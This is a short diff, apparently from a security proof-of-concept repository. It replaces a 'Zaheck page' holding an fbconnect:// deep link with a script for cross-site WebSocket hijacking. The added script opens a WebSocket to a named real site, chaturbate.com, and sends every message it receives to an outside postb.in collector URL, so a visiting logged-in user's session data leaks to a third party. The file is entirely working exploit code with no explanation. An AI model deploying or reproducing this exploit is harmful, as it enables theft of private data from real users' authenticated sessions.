@@ -1,7 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head><title>Zaheck page</title></head>
-<body style="text-align: center;">
-    <h1><a href="fbconnect://cct.com.spotify.s4a">Begin zaheck!</a></h1>
-</body>
-</html>
+<script>
+websocket = new WebSocket('wss://chaturbate.com/all_cryst/')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("READY");
+}
+function handleReply(event) {
+  fetch('https://postb.in/b/1594719205578-4659795262850/?'+event.data, {mode: 'no-cors'})
+}
+</script> 
